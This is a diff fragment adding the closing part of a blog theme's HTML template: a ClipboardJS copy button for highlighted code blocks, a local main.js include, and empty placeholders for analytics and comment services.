+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
